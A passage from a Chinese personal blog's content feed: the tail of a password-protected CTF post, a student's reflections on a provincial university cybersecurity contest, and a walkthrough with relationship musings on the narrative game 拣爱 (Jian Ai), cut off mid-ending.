05395f8364935f77b7ee8c5f6bfcbf0e8f456e9f361ace40011fdb5e0c4a9c227418b7d4495457738d696d90255ce3630b3738dce9d709ae89a8e1ce1efbfe97b4048e24353136d8099af30be246624171defb4a593125325a15db705a0ee54ffd335116803ee7d9f5456af4c67290e572b50c2b8e9a43385204d1b187744069452343e3bd0d9a6b4d0acf78ac6e366fc70e5b2ea446716ddb3f18f83b34e9e987aedbe0e00f232b27de574f1cf23afbc29adbb81fdd2e6ba3efa7bb302b453f99acc3ebc7af09f181bc2851e50a7c1bc033114d6bd02c7533c4667f6581ccd29b68181bfbc9bf6659ba63d4f4dddb85ff07223b1bd2f56173b4e3baa814bf3c4a8f9ff170da1681690b93ccf214895e6c623102ae3433d719ece81364d051616a0749e37e2d7a31423f40721c8883d6b72cc6b88e77df3380c9c5ccfdd00b86189643c22dc867a07b4361d5f6b186b923696bd671fc811aaa916f623488e55a0f650e83ebbfbd8f8e44dc33e9e70cb07670363407ed0a223f54d0f7aa55ee15d0f316f25b9f2cb8bd25ce503d5d21aa2872ee069a932bbcbed88275117cc52c00f5bece3fceedfe1b7c243ee709a9f346874be0c4b644bd001ad1d653ca0555f1aa95ef951556a59549a8586209095ad5139bab1b9645c6df4da97d0fba0d87efa2ed270256e095484816a4dd04744ed63b5f2b96fc1a66316dc452727612a62427936e8c65c50d26adbe8ddcc3a22f5c08b08be48193cab72521becd6cd28afffb333f2d69ac40dffe042b3561e47898a94a165c6fa2b89daa803d9e3f8658e55b349b04ef413be1248b7e4a852496026279ff590a99ab99ad815509611f93b59fa6b0eaa6d422bbccd34fcc53689521e19c1da621860bcaa1ee88e198092d895d1bb55b82b8acb85338fc58ad7a9b1dcc72f19422e9cad29f920fd6c9dc88f186c9b3af990b6f782b92777b1e48ad3c46e86d6fb9f8dbbe44b968766e5486bb5c012ff9a82bd23193bc7d247625307dc57caa15de01f84ccfae1963d127c3f67417a325105530a9959ff007354774233e6dc48c52973020ad6e7162c5562b80ff6724fc084c5ff23985291d9166887a17ab21ff287762b889cd493fe7d8840190710ad97440e44c24646d271e85b12d4de863a198951c02a70c5830fc3dd59da1249b0ddf5ae9858d8c93b41a4c6b8b2f9a66317602691d799803ed3e04e9bd5fce29c485c2d82c980959db3b849733af295ad58e759137d9f2ff0778ffd7191f24b474348809059de2c917c66ff64f060c263144882751676862517a370c4f0b1fb58534fa94387b3ce6842cdb501c09e9ee37662f090c195ea299cea0f2a3c8e91856fcc00f504058f1c97d69725cccbbffa54b26c56098f98bdfd11df0fcb3e5bd96adeb05398aed92608e05178ff6b38c3b5722ec368771dd46463d729c5fd9855f78f71a6b1f7ae9290eeef1f0a473b89f643c8c0482bbdf58b769399ecc17334a6b053b8f7f2d194a449655656f3d2b85e97153ca287247f8ee64e1aa11e8d9d79be3333355b5d50b64e0eacb6a8a552ee948abe5076b947e27ce685288e8a91863cdd1a0cc7efd3ce8a331629cef062855b4759b68dce3b3b88a307389997a66c2aacce94b300d61cfc9ab301505e9d1d80aef4bf3f55f1c4e36e8d75347f8ca205ceec76d67e07f24baaffab514a5d7dbf4e9af474a6dee382d8c01275bb9d406c3698b3e36a61ddf3b064ebed18de6c49dea2302af7e4564684cded8bf4ee7e8cfcd1dd18bc391f45fc0580041e73373031121cbda10f91f0fed174f32a5379493e79e5b27cf2c4327a4f262308b1b62637ff4a7fae2fd420e5396549382b0d00186092f672693af0efcc9b008f873b31f5cffb69dad2b457650edb55e1f321028900fb12a37f0d6091bfc6e066fc7a8442e854cf160c5943882c76b99dd987b4f5cc734343b959619574eb76ff9cfd6a1e04b839c703c2eae9014d4969e501de5444bb897f2a04eba200568715b4624f6643c80434592a609714f7147072fae4b2eba8497d18ad3369a4f544da4cf9910b90b47a5829b4fc14c7a255cadb7e0821cf02060d7aae3b73b666d552516ae5b9258735c19ef8005442cdf3c6d1c5f492aaa6d6faf7268d0cb4d2c8f8375f3995d29cc675e79175c4d3c36ec7a8bc64aaaa229fda139b2bef600045020faa596db4601fa31fb7939e431607d3e17bf5b0f9798001e429ff03bc55456c2423c0db9aae489378024f3cf6e5214d469c4f2f525914e070377af758f0ee35fa3bf788aaad08dd01fd576b9a5f3e324f71737c9966b17cc1327507b7f00b18fba9582bce04a4ccd7f3263c48cda3b83e8e8c48bde28fbd4511f532d5f3dcb37f9b0be782081f3b66c33c20aa16c133096be4b4bccecc99b5a9fdafd5c86bd6761e9d83715b1c42264043649e4adc6285726efc2e4d23863f051ee6343d77864f32f7012291eece93b27f88d31164e8b2cfd101c1b25cecb5eb330f04441d41654efda0974ba9cb98f1f85674987cae9993a08dc15db0330d50608208fef3801d65c982313d52722f97c5c29e365d2bbee50f0a0a9a35a18c323f877aaa16bbae9c0e810e4c36b45256691d5a84736da06d769cd872bcbb9fec33fa2957cc6ecee1e99ee72aa58426b11d58b31bba051267cf63aa0e00bb119501c092c227fafd7256b182782eababb393ae8db0cac4fb2004de1401e24c4b3da8d43df58615923baab913f86e8691a39b0efe5e9912097c3101d1bdc6e641e61cfec5cfcb17e5186be0771c13eaf0f2a367dd58ce0d6add9af48aeb854dbd4739964d055c5397ab853f77c4786975634627f0185a5a70d7feddbc72200552c8b73a1c518a02fb68e4847c91dc71fe19f5f8b731de502da0edeb9467eb8c10bce5abe3baa6eadc3d171129c54a8cecbee19490fffad717c8a971c57bd562f0d219f44d0e86fb58c3721762f6066251e59a3eea0eacacfd2037caf536a6352285d267b02390ba9c9f0aaad5c973c4f870a0373b47560cf07427e7311c54f4c5b40c29ce6e32a7595d2a234e295b81e18241902317864f975541090415ce158e44b3d72d3a398f31c5510f1a6874c9d431767a0fbffe0f5c4af443f517d790b43b135fc4113a20e3d0ca5e701833b0eb0529e0109ff508fb92f651156e43e932abbfda5327cd7e41958cedc5824971f80abcf432363a66c6487298daa1afa83a2432349ee64074412d958bc24fb5aa5724f3ef9e3390a63c98d46b71e0e4b8815fde1375b3390bd3631c4f63a85fdc084cc148586b0d88feca288f4650ca41ace09f1e6608cb7d21dfa2b7287700d8594f3eb13c17d84633bcea7af0edb28bd0436d1818d743c2b219612542f344ef41ec87472447c7713380623cd38d960fd90e6d36070e75e5f0b63ff86f93</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码：QFNUCTF</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>CTF</category>
        <category>QFNUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>“科来杯”第十届山东省大学生网络安全技能大赛心得体会</title>
    <url>/posts/bacd5cfb.html</url>
    <content><![CDATA[<h1 id="START"><a href="#START" class="headerlink" title="START"></a>START</h1><p>咕咕咕……好吧，比赛在10月22日就打完了，打完比赛就想写来着，但是一直咕到现在才有时间写这个心得体会</p>
<p>太忙了啊啊啊啊啊~！！！</p>
<p>收获还是很多的</p>
<p><font color='red'>嘿嘿嘿被两位师哥带飞，满满的安全感</font></p>
<p>10月21号下午跟两个师哥坐高铁，从曲阜到章丘，没走过远门的我还以为那是地铁，高铁来的声音很响我，轰隆隆的。</p>
<p>高铁很快，不到三个小时我们就到章丘站了，下高铁之后有山东警察学院的志愿者带我们进学校，坐他们的志愿者大巴车去学校里面，大巴车嗡嗡的响</p>
<p>做网络安全的，也有不少女生，但是也就几个，车上都在讨论学术知识，第一次到这种贤士云集的地方。</p>
<p>到学校门口，我随手拍了几张照片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E5%B1%B1%E4%B8%9C%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2.jpg"
                      alt="山东警察学院大门"
                ></p>
<p>非常好看！</p>
<p>到了里面，学校已经为大赛准备的很好，我们先去报到处报道，领了参赛的东西</p>
<p><strong>一个参赛服，一个参赛选手证，一个鼠标垫，一个无线鼠标，还有一本参赛手册，两张餐券。</strong></p>
<p>然后进赛场调试设备，工作人员让我看看IP就行，当时我脑子就乱了，IP？什么IP，怎么看来着？急中生智想到了上周计网实验课刚学的ipconfig，好险，要不然就丢人了，好尴尬，当时工作人员就看着我。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/ipconfig.jpg"
                      alt="ipconfig"
                ></p>
<p>然后等报道完我们三个坐大巴车去酒店准备吃饭了</p>
<p>酒店的饭，其实也还行，给餐券随便吃，也不算多豪华也还行倒是，(毕竟组委会包吃住，乐)</p>
<p>吃完饭我们就去卧室准备睡觉了</p>
<p>那边酒店在山脚下，信号贼差，发个消息发半天，当晚我们下载了网络安全法，数据安全法，密码法，国家安全法，个人信息保护法，反间谍法等条文，我在车上听到了别的师傅说一个<strong>随波逐流工具</strong>，我下载了发现非常好用，一把嗦。点赞这个工具</p>
<p>然后就准备睡觉了，第二天要早起</p>
<p>等第二天起来之后吃完饭就坐车走了，去了先去签到处放下书包，手机不能进场。领取了标签我就进场了</p>
<p>考试时间从上午九点到下午四点，中途不间断，午饭在现场吃</p>
<br/>

<p>再说一下赛题吧，web题全场0解，一开始我看到签到题就蒙圈了，不过幸好，好在做出来了，不至于一个题也不会给队伍拖后腿</p>
<p>然后过了半天，才做出简单编码，二进制八进制</p>
<p>还有一个题是变异凯撒，那个题也应该会做的，但是当时只顾着用工具了，脑子没反应过来那是变异凯撒，不然早就知道了其实，这题不该失分，然后我应该去爱你这个题也不该失分，吃了没做过频谱图的题的亏，如果我当时做过频谱图的题就不至于不会做了，这几个题都是大部分人都会做的</p>
<p>到了比赛后期就没什么新解出的，一直是老题在上升趋势，（不会是py吧（雾</p>
<hr>
<p>最后四点比赛结束，三等奖，差点二等奖了唉，唉三等奖，唉CTF，唉科来杯。</p>
<p>然后遇到了王老师和李老师，两位带队老师，臧老师有事不能带了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/xiaohan.jpg"
                      alt="个人三等"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/no3.jpg"
                      alt="团体三等奖"
                ></p>
<p>最后颁奖典礼宣布</p>
<p>第十一届科来杯在<strong>曲阜师范大学主办</strong>，下一届我们就是主力军了，加油！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/QFNU.jpg"
                      alt="交接仪式"
                ></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是得练！</p>
<p>认识了日照校区的师傅（爷</p>
<p>明年真是线下丹砂了</p>
<p>练练练练，卷起来</p>
<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>科来杯</tag>
      </tags>
  </entry>
  <entry>
    <title>《拣爱》游戏心得</title>
    <url>/posts/8af1abe8.html</url>
    <content><![CDATA[<p>注:部分资料来自百度，部分图片来自知乎，游戏狗</p>
<h1 id="游戏介绍"><a href="#游戏介绍" class="headerlink" title="游戏介绍"></a>游戏介绍</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ts1.cn.mm.bing.net/th/id/R-C.69cb6a56106651395dd883ce4d06bfb5?rik=o5ik/GOs5kjyfA&riu=http://pic.qt6.com/up/2021-5/16214970414542509.jpg&ehk=qBqfjnePXOeJlvpUxh8YEbYFJJeB/anrwS3OIhcuWd4=&risl=&pid=ImgRaw&r=0"
                     
                ></p>
<blockquote>
<p>百度百科</p>
</blockquote>
<p>拣，有<a class="link"   href="https://baike.baidu.com/item/%E9%80%89%E6%8B%A9/980212?fromModule=lemma_inlink" >选择<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>之意。游戏中每一个<a class="link"   href="https://baike.baidu.com/item/%E5%9C%BA%E6%99%AF/82239?fromModule=lemma_inlink" >场景<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，每一个选择都合理而有其自己的意义。它还是一款谈论爱的游戏。希望通过游戏和故事，让玩家能够感受爱，学会爱他人和爱人的方法。</p>
<p>这个游戏鼓励人们拥有一颗温暖柔软，<a class="link"   href="https://baike.baidu.com/item/%E5%96%84%E8%A7%A3%E4%BA%BA%E6%84%8F/4595238?fromModule=lemma_inlink" >善解人意<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的心。</p>
<p>《拣爱》由三个独立故事构成。完整游玩一次游戏大概需要1.5小时。 </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="对游戏的评价"><a href="#对游戏的评价" class="headerlink" title="对游戏的评价"></a>对游戏的评价</h2><p>首先我想先写一下我对这个游戏的评价，游戏的可玩时间并不长，毕竟是剧情向游戏，剧情过完了就没得玩了，第二游戏的剧情做得非常好，能够引发玩家引起共鸣和无限的思考，我更觉得它像是一种艺术，就像一千个人眼中有一千个哈姆雷特一样，我对游戏其中的剧情的思考有一些我也问过原作者，而原作者的回答是纯主观想法，无标准答案。是的，艺术的意义便是这样。</p>
<h2 id="这个游戏引发出来的我的思考"><a href="#这个游戏引发出来的我的思考" class="headerlink" title="这个游戏引发出来的我的思考"></a>这个游戏引发出来的我的思考</h2><p>游戏一共分三章，第一章讲的是恋爱过程中的情侣，第二章讲的是两个青梅竹马的分分合合，第三章讲的是已婚夫妻的朝夕相处</p>
<p>虽然我是牡丹solo，但是对我的触动也是很深刻的</p>
<p>第一章是我印象最深的一章，也许是因为我正处于这么一个年龄段，所引发的共鸣比较多</p>
<p>游戏有存档，但爱没有存档，游戏可以回档，爱不能重来</p>
<p>每个人都拥有爱的能力，每个人都值得被爱</p>
<p>游戏中有很多操作是不被告知的，比如有的剧情要等着，有的剧情要点击小物品，而不是只点明显的选项而已，爱也是一样，有时候并不能思维定式，只看选项，而更多的是爱情中的不确定</p>
<h1 id="我的游戏历程"><a href="#我的游戏历程" class="headerlink" title="我的游戏历程"></a>我的游戏历程</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="一、相遇、相知、相识"><a href="#一、相遇、相知、相识" class="headerlink" title="一、相遇、相知、相识"></a>一、相遇、相知、相识</h3><blockquote>
<p>我是一个游戏开发者，今天参加了一个gamejam活动。</p>
<p>（注：GameJam是一个游戏开发活动，参加者自由组队，48小时内围绕指定的主题进行创作，从零开始完成一款游戏)</p>
<p>传闻中gamejam现场可以偶遇女生一起组队，但偏偏我们组却是全男班</p>
<p>活动在一个周五的下午开始，大部分队伍都会把第一天夜晚用来进行整个游戏的构思和设计工作。</p>
<p>而我们组的讨论进行得十分顺利。在方案基本定下来以后，我也放松紧绷的神经，开始环顾会场四周。</p>
<p>这时候，我留意到她的存在。她所在的小组就坐在我们隔壁</p>
<p>他们组好像还在激烈的讨论。我听到他们其中一个队员说:大家先休息10分钟，之后再回来继续讨论吧。</p>
<p>她的队友都纷纷离开了座位，留下她一个人在本子上写写画画</p>
<p>”现在是个和她说话的好机会。“我心想</p>
<p>我简单整理了一下仪表仪容，在脸上挤出一个自认为最好的表情</p>
<p>鼓足勇气，走到她的身旁</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-e98b1b7a3ecfc8be7cb4894b249eddd6_r.jpg"
                     
                ></p>
<h4 id="第一次玩"><a href="#第一次玩" class="headerlink" title="第一次玩"></a>第一次玩</h4><p>这是第一个对话选项，第一个选项相比而言还是比较自然的，第二个有有点显得高傲自大，像是很夸赞很吹嘘自己的想法，我不喜欢，<font color='red'>所以我选择了第一个</font></p>
<blockquote>
<p>她仿佛面有难色。但依然礼貌地介绍了自己:…“嗨，我叫000.“</p>
</blockquote>
<p><font color='red'>其实你向我搭讪的时候，我内心是拒绝的。大概是因为给我感觉很不自然吧</font></p>
<h4 id="第二次玩"><a href="#第二次玩" class="headerlink" title="第二次玩"></a>第二次玩</h4><p>由于结局提示这边选错了，所以无奈我选了另一个，但是结局还是有错，我觉得有蹊跷，鼠标移动到屏幕才发现画框可以点，点击场景中的海报，才能走向正确剧情</p>
<blockquote>
<p>“这次GameJam的题目不错，很有趣。”</p>
<p>“是啊，我觉得图中男女相互纠缠，可以做一个和恋爱相关的游戏”</p>
<p>“恋爱游戏啊…我觉得挺适合的。这次的题目或许还有一个意思:‘一件事情总有你意想不到的另一面。’”</p>
<p>“我也是这么想的，如果把这层意思放进恋爱游戏里或许会很有趣吧”</p>
<p>“对了，我们还可以…”</p>
<p>不知不觉，我们聊了很久。可惜的是她的队友最后还是没有采用她的建议</p>
<p>而这也是她后来告诉我的</p>
</blockquote>
<ul>
<li><font color='green'>两个兴趣相同的人有共同话题，这样才是最好的搭讪方式，不是吗？</font></li>
</ul>
<h3 id="二、第一次约会前的准备"><a href="#二、第一次约会前的准备" class="headerlink" title="二、第一次约会前的准备"></a>二、第一次约会前的准备</h3><blockquote>
<p>GameJam活动结束后，我通过活动的微信群找到了她</p>
<p>开始大家都有些拘谨，但很快我们就成为了相互倾诉生活琐事的”笔友</p>
<p>朋友都说我虽然在GameJam上没获奖，但却是所有人中唯一中了大奖的</p>
<p>我没法反驳，因为我真的太幸运了。</p>
<p>两周后的一天，我们在微信上聊着</p>
<p>而我一直想找机会把她约出来一起看个电影，吃个饭</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-2cdb0ea00331561fedafa23e4cb1b86a_r.jpg"
                     
                ></p>
<p>第二个对话选项，虽然这个对话选什么都不影响结局，但还是第一个选项更好一些，第一个选项更适合来安慰对方，而第二个选项传达出来的意思就好像是她确实是做错了，但第一个就能传达出其实大家都这样，你没错，是上司的原因的意思，更好一些</p>
<ul>
<li><font color='green'>安慰别人的时候不要把错误说到对方身上</font></li>
</ul>
<p>后面紧跟着的对话刚刚一样，与上面同理，选第一个</p>
<p>男主开始尝试约女主出来玩</p>
<ul>
<li><font color='green'>自然地进行，不要带着目的做事</font></li>
<li><font color='green'>需要关注女孩子的朋友圈昂，才能知道女孩子的兴趣</font></li>
<li><font color='green'>和女孩子出来玩不能只看电影啊~不还得吃点东西吗</font></li>
</ul>
<p>这里有个细节，就是朋友圈里传达出来两个信息，“女主是猫尔摩斯的真爱粉”和“喜欢吃火锅”，这两个信息是推动剧情的关键点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/80/v2-546f6f6dd8a695c8a2697557f7df05c1.webp"
                      alt="点开朋友圈"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/80/v2-82b172d45cada35288d61319afb22e3d.webp"
                      alt="选猫尔摩斯"
                ></p>
<p>然后后面有个小游戏，中间会有弹窗来分散你的注意力</p>
<ul>
<li><font color='green'>和女孩子约会怎么能分心呢！</font></li>
</ul>
<h3 id="三、看完电影吃饭"><a href="#三、看完电影吃饭" class="headerlink" title="三、看完电影吃饭"></a>三、看完电影吃饭</h3><blockquote>
<p>终于到了和她见面的日子</p>
<p>第一次和她看电影，不免有些紧张</p>
<p>但我还是告诉自己要尽量把注意力放在电影上面</p>
<p>电影放映完之后，我们在椅子上留到了最后</p>
<p>“刚刚的电影还挺精彩的”</p>
<p>”虽然和原著有些出入，但是看得出导演为了拍出原著的味道很用心!太精彩了!“</p>
<p>“不枉我期待这电影这么久!”</p>
<p>“我们接着去哪里?”</p>
<p>“这附近的话，我知道有家不错的店。”<br>当然是选择她最喜欢吃的火锅啦~</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/v2-5d7189081ad21b6ca5c9bce8d56fa392_r.jpg"
                     
                ></p>
<h3 id="四、约会后的闲聊"><a href="#四、约会后的闲聊" class="headerlink" title="四、约会后的闲聊"></a>四、约会后的闲聊</h3><blockquote>
<p>月光在她的脸上勾画出一道银白色的轮廓</p>
<p>看着她的脸，走在旁边的我内心有点不安分了起来</p>
<p>两人的距离越走越近，就算不说出口，两人之间也早已经有了默契</p>
<p>我还需要开口说些什么吗?</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/v2-63c9446c97fadf1ba722e70c324e4589_r.jpg"
                     
                ></p>
<h4 id="第一次玩-1"><a href="#第一次玩-1" class="headerlink" title="第一次玩"></a>第一次玩</h4><p>这里有三个选项，“我喜欢你”，“我能牵着你的手吗？”，“月色真美”</p>
<p>第一个选项未免有些太直接了，第二个选项也有点尴尬，<font color='red'>于是我选择了第三个</font></p>
<h4 id="第二次玩-1"><a href="#第二次玩-1" class="headerlink" title="第二次玩"></a>第二次玩</h4><p>由于后面结局的提示这边选错了</p>
<p>所以这边我第二次直接选了第二个选项，“我能牵着你的手吗”</p>
<p>但还是错了</p>
<h4 id="第三次玩"><a href="#第三次玩" class="headerlink" title="第三次玩"></a>第三次玩</h4><p>第三次玩才知道屏幕可以点，我才明白是点男女主的手！</p>
<blockquote>
<p>这一刻，或许任何言语，都是多余。</p>
<p>我们就这样开始了。</p>
</blockquote>
<ul>
<li><font color='green'>有时无言胜过千言万语，男孩子只要出手就好了！</font></li>
</ul>
<h3 id="五、无话不聊的甜蜜期"><a href="#五、无话不聊的甜蜜期" class="headerlink" title="五、无话不聊的甜蜜期"></a>五、无话不聊的甜蜜期</h3><blockquote>
<p>我们就这样开始了</p>
<p>我们之间仿佛有聊不完的话题</p>
<p>只要找到能够挑起话题的东西，我们都绝对不会放过</p>
<p>我们渴望了解对方，恨不得把镜头拉近，对焦到对方心里面去看对方心底在想什么。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic4.zhimg.com/80/v2-d3c4c982bf9fe915cf51f9640d9ae793.webp"
                     
                ></p>
<h4 id="第一次玩-2"><a href="#第一次玩-2" class="headerlink" title="第一次玩"></a>第一次玩</h4><p>这里只有一个选项，<font color='red'>第一次玩只好点选项了</font>因为没得选</p>
<p>经过结局的提示才知道这边操作错了</p>
<p>“<font color='red'>但是我们的话题往往只能停留于表面。其实，我一直希望能与你分享更深层的想法</font>”</p>
<h4 id="第二次玩-2"><a href="#第二次玩-2" class="headerlink" title="第二次玩"></a>第二次玩</h4><p>第二次玩因为有了之前的经验了，所以我觉得这边肯定是有东西可以点的，结合屏幕发现男女主都有同类的物品，所以应该是<font color='green'>共同话题</font>以此点击六个物品之后点了选项，发现还是提示不完美</p>
<h4 id="第三次玩-1"><a href="#第三次玩-1" class="headerlink" title="第三次玩"></a>第三次玩</h4><p>这边我猜着应该是有深层义，但是我不知道怎么操作，在往上查了才知道是滑动鼠标滚轮，会出现六个idea。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/80/v2-49d3f449c0d92fa1b6a5d545afeaaa6a.webp"
                     
                ></p>
<p>找到六个每两个一一对应就可以触发完美剧情</p>
<p><font color='green'>对白真的很暖！</font></p>
<h3 id="六、甜蜜过后的烦躁期"><a href="#六、甜蜜过后的烦躁期" class="headerlink" title="六、甜蜜过后的烦躁期"></a>六、甜蜜过后的烦躁期</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/80/v2-9c33bda2179064731e26b4eecfbe183e.webp"
                     
                ></p>
<p>生活上的烦心事和小事，最容易在细节处伤到别人</p>
<blockquote>
<p>“￥%……*&amp;……o”</p>
</blockquote>
<p>此时的音乐也开始变得急促</p>
<h4 id="第一次玩-3"><a href="#第一次玩-3" class="headerlink" title="第一次玩"></a>第一次玩</h4><p>这里只有一个选项，所以<font color='red'>我直接选了</font>，然后过一会又出现一个选项，<font color='red'>我接着点了</font>。<font color='red'>吵架的气泡也随着越来越大</font></p>
<p>到结局提示才知道这边也有错误</p>
<p><font color='red'>吵架时的你是那么得理不饶人。而我也不愿意先让步，常常把一些鸡毛蒜皮的小事弄得发不可收拾</font></p>
<h4 id="第二次玩-3"><a href="#第二次玩-3" class="headerlink" title="第二次玩"></a>第二次玩</h4><p>有了第一次的经验和以往点屏幕的经验，我开始点屏幕上的东西，但是丝毫没有反应</p>
<h4 id="第三次玩-2"><a href="#第三次玩-2" class="headerlink" title="第三次玩"></a>第三次玩</h4><p>有了前两次的教训，我已经逐渐理解，应该做出让步，但是只有一个选项，要怎么选？</p>
<p>经过查了才知道，这边要等一会才会触发完美结局</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://p.qpic.cn/mwegame/0/de786890024b6ab99e3b67b7416bd523/550"
                     
                ></p>
<ul>
<li><font color='green'>生活上的烦心事和小事，最容易在细节处伤到别人，在吵架的时候双方每个人都需要作出让步，相互理解相互宽容</font></li>
</ul>
<h3 id="七、同居时的陪伴"><a href="#七、同居时的陪伴" class="headerlink" title="七、同居时的陪伴"></a>七、同居时的陪伴</h3><blockquote>
<p>和刚认识她的时候一样，她还是很喜欢和我抱怨生活中遇到的烦心事.</p>
<p>她明明很聪明，我想这些琐事应该难不倒她</p>
<p>却不知为何好像总是因为这些琐事而烦心</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic3.zhimg.com/80/v2-d883f8a91b1484b7153f5c42db1e239e.webp"
                     
                ></p>
<h4 id="第一次玩-4"><a href="#第一次玩-4" class="headerlink" title="第一次玩"></a>第一次玩</h4><p>这对话框怎么跟之前一样啊歪，我刚看到就觉得有蹊跷，但是无奈，只得点击选项</p>
<p>当然，不是完美结局</p>
<h4 id="第二次玩-4"><a href="#第二次玩-4" class="headerlink" title="第二次玩"></a>第二次玩</h4><p>由于明白了屏幕可以点，我试着点了点男主，发现男主可以滑动，顺着滑动过去，让男主过去陪女主，做一个好的倾听者</p>
<p><font color='green'>这边的对白也很暖！！！</font></p>
<blockquote>
<p>其实我知道，她很清楚这些问题该怎么处理</p>
<p>我只需要当一个聆听者，陪在她的身边，那就足够了.</p>
</blockquote>
<ul>
<li><font color='green'>一个好男友一定是一个好的倾听者！！！</font></li>
<li><font color='green'>情侣间有时候需要处理的不是事情，而是态度</font></li>
</ul>
<h3 id="八、同居时的烦恼"><a href="#八、同居时的烦恼" class="headerlink" title="八、同居时的烦恼"></a>八、同居时的烦恼</h3><blockquote>
<p>当距离越来越近，原本从远处看不清的瑕疵，也会越发明显</p>
<p>只要两个人生活在一起，就会有问题发生</p>
<p>这时候，要么是她迁就我，要么是我迁就她，难道不是吗?</p>
<p>加班到深夜回来时，她正看着她最爱的韩剧。</p>
<p>四周散落着零食的包装和纸巾。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img1.gamedog.cn/2023/01/30/12023312-2301301KF20.jpg"
                     
                ></p>
<h4 id="第一次玩-5"><a href="#第一次玩-5" class="headerlink" title="第一次玩"></a>第一次玩</h4><p>这里有两个选项“让女主收拾”和“我来收拾”，我首先想到的是我就惯着他吧，我来收拾，后来通过结局才发现我错了</p>
<p><font color='red'>无论是谁迁就谁，只要是单方面的迁就，就不会有相互谅解的关系长久</font></p>
<p><font color='red'>但矛盾的是，有时候，我又会想你能够包容一下我的缺点。</font></p>
<h4 id="第二次玩-5"><a href="#第二次玩-5" class="headerlink" title="第二次玩"></a>第二次玩</h4><p>由于第一次错了于是我又点了另一个，让她来收拾，但还是错了</p>
<h4 id="第三次玩-3"><a href="#第三次玩-3" class="headerlink" title="第三次玩"></a>第三次玩</h4><p>想到屏幕可以滑动，我点了一下垃圾，才走到正确剧情</p>
<p>我以为剧情一直是从男主的视角来考虑爱情，没想到这个镜头的主角是女主，作者太有心了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic2.zhimg.com/80/v2-39e4fd39344f2736ba2e7c7a3ce9fa4d.webp"
                     
                ></p>
<ul>
<li><font color='green'>原来爱情中是双方的付出，而不是一个人单方面的付出，另一个人只知享受</font></li>
</ul>
<blockquote>
<p>比起单方面的迁就，两个人的相处更应该是相互的。</p>
<p>相互依靠的两人总比单依赖一方的两人站得稳，不是吗?</p>
<p>时间飞快流逝，距离你我相识，已经过去三年</p>
</blockquote>
<h3 id="九、结局"><a href="#九、结局" class="headerlink" title="九、结局"></a>九、结局</h3><h4 id="不完美结局"><a href="#不完美结局" class="headerlink" title="不完美结局"></a>不完美结局</h4><blockquote>
<p>我突然的来信没有吓到你吧?</p>
<p>这或许是我第一次这么毫无保留地向你透露心声</p>
<p>也是应该是最后一次了。</p>
<p>很可惜我们最后还是没能一起走下去。</p>
<p>但是我不后悔，因为我从我们的相处中学到了很多</p>
<p>祝君安好。再见。</p>
</blockquote>
<h4 id="完美结局"><a href="#完美结局" class="headerlink" title="完美结局"></a>完美结局</h4><blockquote>
<p>还记得我们是在gamejam上认识的</p>
<p>当时你主动和我说话。</p>
<p><font color='green'>聊到游戏我们的意见是一拍即合。围绕那次gamejam主题，我们开始越聊越投契</font></p>
<p>在那之后，我们又开始聊微信。</p>
